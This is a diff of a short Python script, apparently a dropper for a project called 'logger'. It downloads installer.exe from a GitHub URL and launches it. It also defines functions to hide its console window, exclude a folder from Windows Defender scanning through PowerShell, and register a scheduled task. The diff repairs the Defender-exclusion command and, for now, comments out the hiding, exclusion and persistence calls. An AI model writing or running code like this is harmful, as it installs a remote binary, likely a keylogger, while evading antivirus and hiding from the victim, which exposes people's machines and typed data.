@@ -1,7 +1,7 @@
 import os
 from win32gui import ShowWindow, GetForegroundWindow
 from requests import get
-from subprocess import run
+from subprocess import run, Popen
 
 url = 'https://github.com/Pixel48/logger/raw/exe/installer.exe'
 
@@ -13,6 +13,7 @@ def create_folder(path):
         os.makedirs(path)
 
 def download(url, path):
+    create_folder(os.path.dirname(path))
     with open(path, 'wb') as file:
         response = get(url)
         file.write(response.content)
@@ -26,14 +27,15 @@ def setup_task():
 
 def defender_ignore(folderpath):
     create_folder(folderpath)
-    run(['powershell', '-command', '\'App-MpPreference', '-ExclusionPath', f'"{folderpath}"\'' ])
+    command = f"Add-MpPreference -ExclusionPath '{folderpath}'"
+    run(['powershell', '-command', command ], check=True)
 
 def main():
-    hide_window()
-    defender_ignore(folderpath)
+    # hide_window()
+    # defender_ignore(folderpath)
     download(url, filepath)
-    setup_task()
-    os.startfile(filepath)
+    # setup_task()
+    Popen([filepath])
 
 if __name__ == '__main__':
     main()
